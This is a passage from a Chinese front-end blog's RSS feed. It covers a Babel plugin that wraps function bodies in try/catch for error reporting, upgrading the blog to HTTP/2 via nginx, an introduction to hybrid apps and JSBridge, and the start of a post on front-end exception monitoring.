                &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;property&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Identifier&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;log&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;computed&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;arguments&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Identifier&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sourceType&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;module&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到我们的AST是一个树形的结构，并且每一个节点的结构都是差不多的。&lt;/p&gt;

&lt;p&gt;每个节点可以是&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;变量定义（VariableDeclaration）&lt;/li&gt;
  &lt;li&gt;函数定义（FunctionDeclaration）&lt;/li&gt;
  &lt;li&gt;块语句（BlockStatement）&lt;/li&gt;
  &lt;li&gt;等等，很多，这里不列举了&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;节点自身又会包含类型，代码起始位置，子元素等属性。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;那么思路就是获取到源代码中所有函数的函数体，再使用自定义的try/catch语句包裹住，做异常上报的事情。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;幸运的是babel有提供遍历AST，修改AST，生成新的源代码的能力。&lt;/p&gt;

&lt;p&gt;所以，为了方便我选择了直接开发一个babel-plugin。（你也可以开发webpack的loader或者其他能操控AST的玩意）&lt;/p&gt;

&lt;p&gt;这个babel-plugin的源代码很简单，很方便的一个地方就是可以直接用&lt;code class=&quot;highlighter-rouge&quot;&gt;babel-template&lt;/code&gt;来直接写包裹函数的代码。&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;template&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'babel-template'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//异常上报的try/catch代码字符串&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tryCatchWrapper&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`{
    try{
        BODY
    }catch(ERR){
        console.log(ERR);
    }
}`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;plugin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;//visitor可以理解为遍历AST的一个单位&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;visitor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;visitor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      		&lt;span class=&quot;c1&quot;&gt;//对函数进行处理&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;Function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;errorVariableName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;generateUidIdentifier&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'e'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;c1&quot;&gt;//拿到函数体内的代码块，用try/catch包住&lt;/span&gt;
                &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'body'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replaceWith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tryCatchWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
                    &lt;span class=&quot;na&quot;&gt;BODY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;na&quot;&gt;ERR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;errorVariableName&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}));&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;plugin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;整个逻辑很简单&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;遍历AST&lt;/code&gt; =&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;处理函数&lt;/code&gt; =&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;包裹着函数体&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;接下来的事情，就是让babel帮你生成新的代码了。&lt;/p&gt;

&lt;h3 id=&quot;总结&quot;&gt;总结&lt;/h3&gt;

&lt;p&gt;这种方式虽然可以实现异常上报功能，但是个人觉得有一些缺点&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;侵入源代码&lt;/li&gt;
  &lt;li&gt;加大了源代码的体积&lt;/li&gt;
  &lt;li&gt;接入方式不够便利，需要在构建阶段接入&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;当然，只是一个思路～&lt;/p&gt;
</description>
        <pubDate>Sun, 12 Aug 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2018/08/12/js/</link>
        <guid isPermaLink="true">http://localhost:4000/2018/08/12/js/</guid>
        
        <category>babel</category>
        
        <category>AST</category>
        
        <category>JavaScript</category>
        
        
      </item>
    
      <item>
        <title>我的博客升级至HTTP/2啦～</title>
        <description>&lt;p&gt;打开chrome开发者工具，选中&lt;strong&gt;network&lt;/strong&gt;这一栏，可以发现&lt;strong&gt;protocol&lt;/strong&gt;已经变成&lt;em&gt;h2&lt;/em&gt;了。这代表着协议是HTTP/2。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog_upgrade.jpeg&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;升级到http2有什么好处呢我停留在http11不好吗&quot;&gt;升级到HTTP/2有什么好处呢？我停留在HTTP/1.1不好吗&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;HTTP/1.x 客户端需要使用多个连接才能实现并发和缩短延迟；&lt;/p&gt;

  &lt;p&gt;HTTP/1.x 不会压缩请求和响应标头，从而导致不必要的网络流量；&lt;/p&gt;

  &lt;p&gt;HTTP/1.x 不支持有效的资源优先级，致使底层 TCP 连接的利用率低下；等等。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;HTTP/2解决了以上的问题。分为三点&lt;strong&gt;多路复用&lt;/strong&gt;，&lt;strong&gt;头部压缩&lt;/strong&gt;，&lt;strong&gt;服务器推送&lt;/strong&gt;。&lt;/p&gt;

&lt;h4 id=&quot;多路复用&quot;&gt;多路复用&lt;/h4&gt;

&lt;p&gt;在&lt;strong&gt;HTTP/1.0&lt;/strong&gt;中，每请求一个资源，都需要建立一次TCP连接，然后发起HTTP请求。请求完毕后，这个TCP连接就关闭了。我们都知道每完成一次TCP连接，都需要三次握手，四次挥手。&lt;/p&gt;

&lt;p&gt;现在web页面里的请求数一般都不少，所以在HTTP/1.0的时候，100个请求意味着100次的TCP链接的建立和关闭。这个消耗时间是很长的，因为同一个域名下，浏览器最大只支持同时6个TCP连接。&lt;/p&gt;

&lt;p&gt;&lt;em&gt;所以我们会把不同资源，放到不同域名下，提升请求资源的并发数。但这样会造成解析DNS的压力。&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;在HTTP/1.1中，所有的连接默认都是持续连接。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;HTTP持久连接&lt;/strong&gt;（&lt;strong&gt;HTTP persistent connection&lt;/strong&gt;，也称作&lt;strong&gt;HTTP keep-alive&lt;/strong&gt;或&lt;strong&gt;HTTP connection reuse&lt;/strong&gt;）是使用同一个&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE&quot;&gt;TCP&lt;/a&gt;连接来发送和接收多个HTTP请求/应答，而不是为每一个新的请求/应答打开新的连接的方法。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Connection: Keep-Alive
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这意味着，TCP连接在获取资源后不会立即关闭，而是持续到浏览器/服务器认为这次会话结束。&lt;/p&gt;

&lt;p&gt;并且这个连接可以发送和接受多个HTTP请求，意味着整体请求速度的提升，因为减少了不必要的TCP连接（三次握手，四次挥手）。&lt;/p&gt;

&lt;h5 id=&quot;今天的web应用里动辄上百个请求资源keep-alive也有些hold不住了请求并发数还是为6资源需要排队请求这个叫做队首阻塞问题&quot;&gt;今天的web应用里动辄上百个请求资源，keep-alive也有些hold不住了，请求并发数还是为6，资源需要排队请求。这个叫做队首阻塞问题。&lt;/h5&gt;

&lt;p&gt;HTTP/2中的&lt;strong&gt;多路复用&lt;/strong&gt;，就是解决了这个问题。它允许在一个TCP连接上，进行进行多个资源的并发交换。&lt;/p&gt;

&lt;p&gt;通过在TCP（传输层）和HTTP/2（应用层）这俩层中，添加一个二进制分帧层。把http报文切割成更小的信息和帧，使用二进制的格式进行编码。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;每条消息都是一条逻辑 HTTP 消息（例如请求或响应），包含一个或多个帧。&lt;/li&gt;
  &lt;li&gt;帧是最小的通信单位，承载着特定类型的数据，例如 HTTP 标头、消息负载，等等。 来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;例如下图，http/1.1的头部被封装成HEADERS帧，请求体被封装成DATA帧。这些帧可以乱序发送，因为它们帧头带有标识符，用来按序重组。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/binary_frame_layer.jpeg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这样的话， HTTP 消息分解为独立的帧，交错发送，然后在另一端重新组装。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;并行交错地发送多个请求，请求之间互不影响。&lt;/li&gt;
  &lt;li&gt;并行交错地发送多个响应，响应之间互不干扰。&lt;/li&gt;
  &lt;li&gt;使用一个连接并行发送多个请求和响应。&lt;/li&gt;
  &lt;li&gt;不必再为绕过 HTTP/1.x 限制而做很多工作（请参阅&lt;a href=&quot;https://hpbn.co/optimizing-application-delivery/#optimizing-for-http1x&quot;&gt;针对 HTTP/1.x 进行优化&lt;/a&gt;，例如级联文件、image sprites 和域名分片。&lt;/li&gt;
  &lt;li&gt;消除不必要的延迟和提高现有网络容量的利用率，从而减少页面加载时间。&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;等等…&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个多路复用对页面请求速度的提升还是很大的，可以看下这个&lt;a href=&quot;https://http2.akamai.com/demo&quot;&gt;demo&lt;/a&gt;。&lt;/p&gt;

&lt;h4 id=&quot;服务器推送&quot;&gt;服务器推送&lt;/h4&gt;

&lt;p&gt;这里指的资源的推送。&lt;/p&gt;

&lt;p&gt;简单的说就是服务器在和浏览器建立连接后，服务器主动把一些未来要用到的资源推送到浏览器，浏览器缓存下来。&lt;/p&gt;

&lt;p&gt;这里暂时不去深入研究。作用是优化页面的展示速度。&lt;/p&gt;

&lt;h4 id=&quot;头部压缩&quot;&gt;头部压缩&lt;/h4&gt;

&lt;p&gt;字面意思，内部实现暂时不去看。作用是减少了http传输的开销。&lt;/p&gt;

&lt;h5 id=&quot;关于http2详细的信息请看google的简介&quot;&gt;关于http/2详细的信息请看google的&lt;a href=&quot;https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn&quot;&gt;简介&lt;/a&gt;。&lt;/h5&gt;

&lt;h3 id=&quot;升级过程&quot;&gt;升级过程&lt;/h3&gt;

&lt;h5 id=&quot;那么升级到http2麻烦吗是不是要大改&quot;&gt;那么升级到HTTP/2麻烦吗？是不是要大改？&lt;/h5&gt;

&lt;p&gt;因为HTTP/2只支持HTTPS，所以我们升级的前提是我们是HTPPS协议。假如你的网站是有添加 &lt;strong&gt;SSL&lt;/strong&gt; （安全套接层，提供加密 / 认证功能）的话，完全不麻烦！只用改一下服务器配置。&lt;/p&gt;

&lt;p&gt;因为HTTP/2 仍是对之前 HTTP 标准的扩展，而非替代。&lt;/p&gt;

&lt;p&gt;HTTP 的应用语义不变，提供的功能不变，HTTP 方法、状态码、URI 和Header等这些核心概念也不变。&lt;/p&gt;

&lt;p&gt;对我来说，我之前给本博客添加&lt;strong&gt;SSL&lt;/strong&gt;这一层，使得我们可以使用HTTPS协议。所以我想升级至HTTP/2的话，只用去修改博客的服务器配置就好。我使用的是&lt;strong&gt;nginx&lt;/strong&gt;，在1.9.5版本后都已经支持升级HTTP/2。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.nginx.com/blog/nginx-1-9-5/&quot;&gt;教程&lt;/a&gt;如下&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Enabling HTTP/2&lt;/p&gt;

  &lt;p&gt;To enable HTTP/2 support, simply add the &lt;code class=&quot;highlighter-rouge&quot;&gt;http2&lt;/code&gt; parameter to all &lt;code class=&quot;highlighter-rouge&quot;&gt;listen&lt;/code&gt; directives. Also include the &lt;code class=&quot;highlighter-rouge&quot;&gt;ssl&lt;/code&gt; parameter, required because browsers do not support HTTP/2 without encryption.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;所以我只用给&lt;code class=&quot;highlighter-rouge&quot;&gt;listen&lt;/code&gt;指令里添加&lt;code class=&quot;highlighter-rouge&quot;&gt;http2&lt;/code&gt;参数。如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/nginx_config_h2.jpeg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接下来执行&lt;code class=&quot;highlighter-rouge&quot;&gt;nginx -s reload&lt;/code&gt;，重启nginx服务即可。&lt;/p&gt;

&lt;p&gt;即然升级过程如此简单，又有这么多好处，建议大家都考虑升级一下～&lt;/p&gt;
</description>
        <pubDate>Thu, 28 Jun 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2018/06/28/js/</link>
        <guid isPermaLink="true">http://localhost:4000/2018/06/28/js/</guid>
        
        <category>http/2</category>
        
        
      </item>
    
      <item>
        <title>初识hybrid开发</title>
        <description>&lt;p&gt;提到hybrid开发，我们先明确俩个概念，webApp和原生app。&lt;/p&gt;

&lt;h4 id=&quot;webapp&quot;&gt;webApp&lt;/h4&gt;

&lt;p&gt;​	webApp是使用 html + css +javascript 开发出的app。一般是将页面部署在服务器上，用户可以直接在浏览器中使用。&lt;/p&gt;

&lt;h4 id=&quot;优点&quot;&gt;优点&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;开发成本低，更新快&lt;/li&gt;
  &lt;li&gt;不用手动更新，不需要用户去应用市场下载&lt;/li&gt;
  &lt;li&gt;跨多个平台和终端在浏览器中使用&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;缺点&quot;&gt;缺点&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;体验较原生app差&lt;/li&gt;
  &lt;li&gt;无法使用系统级别的功能，例如照相机，通知等&lt;/li&gt;
  &lt;li&gt;入口在浏览器中，不如原生app的级别高&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;nativeapp&quot;&gt;NativeApp&lt;/h4&gt;

&lt;p&gt;​	nativeApp指的是传统的的原生app，Android基于Java语言,底层调用Google的 API；IOS基于Oject-C或者Swift语言,底层调用App官方提供的API。并且需要下载使用。&lt;/p&gt;

&lt;h4 id=&quot;优点-1&quot;&gt;优点&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;支持复杂的动画，用户体验好&lt;/li&gt;
  &lt;li&gt;可以使用系统级别的功能&lt;/li&gt;
  &lt;li&gt;可以线下使用&lt;/li&gt;
  &lt;li&gt;应用下载可以盈利&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;缺点-1&quot;&gt;缺点&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;开发成本高，无法跨平台&lt;/li&gt;
  &lt;li&gt;更新流程又长又慢，需要审核&lt;/li&gt;
  &lt;li&gt;新版本需要重新下载更新&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;hybridapp&quot;&gt;hybridApp&lt;/h4&gt;

&lt;p&gt;而hybridApp指的就是NativeApp与webApp的结合体。&lt;/p&gt;

&lt;p&gt;一般是Native 的框架加上Web 的内容。它具备着二者的优点和缺点。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;实现复杂的动画，不如nativeApp的实现完美&lt;/li&gt;
  &lt;li&gt;为了模拟nativeApp的UI和操作感，需要投入额外的资源&lt;/li&gt;
  &lt;li&gt;可以实现热更新，app的更新不用再重新下载了（发布起来更方便）&lt;/li&gt;
  &lt;li&gt;拥有nativeApp能使用的系统级功能&lt;/li&gt;
  &lt;li&gt;可以三端同构（iOS/Android/Web），可以跨平台，减轻了开发成本&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这些优缺点中，最被吐槽的还是hybrid性能太差了。//////&lt;/p&gt;

&lt;p&gt;那么，身为前端开发，我们可以想一下javascript + html + css是怎么能在原生app中被执行的呢？&lt;/p&gt;

&lt;h5 id=&quot;答案是利用jsbridge来让native和前端js通信&quot;&gt;答案是利用&lt;strong&gt;JSBridge&lt;/strong&gt;来让Native和前端js通信。&lt;/h5&gt;

&lt;h3 id=&quot;jsbridge&quot;&gt;JSBridge&lt;/h3&gt;

&lt;p&gt;简单来讲，JSBridge主要是 &lt;strong&gt;给 JavaScript 提供调用 Native 功能的接口&lt;/strong&gt;，让混合开发中的『前端部分』可以方便地使用地址位置、摄像头甚至支付等 Native 功能。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;JS 向 Native 发送消息：调用 Native 相关功能，通知 Native 当前 JS的状态等&lt;/li&gt;
  &lt;li&gt;Navtive 向 JS 发送消息： 回调调用结果，消息推送等&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;JSBridge的通信实现方式有俩种&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;注入API&lt;/li&gt;
  &lt;li&gt;拦截 URL SCHEME&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;注入API的主要原理是，通过 WebView 提供的接口，向 JavaScript 的 Context（window）中注入对象或者方法，让 JavaScript 调用时，直接执行相应的 Native 代码逻辑，达到 JavaScript 调用 Native 的目的。&lt;/p&gt;

&lt;p&gt;先解释一下 URL SCHEME：URL SCHEME是一种类似于url的链接，是为了方便app直接互相调用设计的，形式和普通的 url 近似，主要区别是 protocol 和 host 一般是自定义的，例如: weixin://mini/url?url=&lt;a href=&quot;http://ymfe.tech/&quot;&gt;http://ymfe.tech&lt;/a&gt;，protocol 是 weixin，host 则是 mini。&lt;/p&gt;

&lt;p&gt;拦截 URL SCHEME 的主要流程是：Web 端通过某种方式（例如 iframe.src）发送 URL Scheme 请求，之后 Native 拦截到请求并根据 URL SCHEME（包括所带的参数）进行相关操作。&lt;/p&gt;

&lt;p&gt;这里详细的实现方式，我还无法介绍，仅作了解。&lt;/p&gt;

</description>
        <pubDate>Wed, 27 Jun 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2018/06/27/js/</link>
        <guid isPermaLink="true">http://localhost:4000/2018/06/27/js/</guid>
        
        <category>hybrid</category>
        
        
      </item>
    
      <item>
        <title>关于前端异常监控系统的一些思考</title>
        <description>&lt;h3 id=&quot;javascript异常上报的必要性&quot;&gt;&lt;em&gt;javascript异常上报的必要性&lt;/em&gt;&lt;/h3&gt;

&lt;p&gt;我们的web页面在开发完成上线后，实际上这个时候的web页面还存在着很多bug。&lt;/p&gt;

&lt;p&gt;其中有些是js脚本里抛出的异常。我们无法在上线前解决他们，因为这些异常出现的场景我们不一定能触发。&lt;/p&gt;

&lt;p&gt;这个时候，&lt;strong&gt;前端异常上报系统&lt;/strong&gt;就显得十分有意义了。它能帮助开发者定位脚本里的异常位置，解决异常问题，减少web页面的crash情况，优化用户体验。&lt;/p&gt;

&lt;h3 id=&quot;我们需要捕获哪些异常&quot;&gt;&lt;em&gt;我们需要捕获哪些异常？&lt;/em&gt;&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;javascript脚本里的异常&lt;/li&gt;
  &lt;li&gt;静态资源异常，包括js、img、css等&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;静态资源的异常很好监控，一般直接给相应的DOM节点监听&lt;em&gt;error&lt;/em&gt;事件就行。重点是javascript脚本里的异常捕获。&lt;/p&gt;

&lt;h3 id=&quot;如何捕获脚本异常&quot;&gt;&lt;em&gt;如何捕获脚本异常？&lt;/em&gt;&lt;/h3&gt;

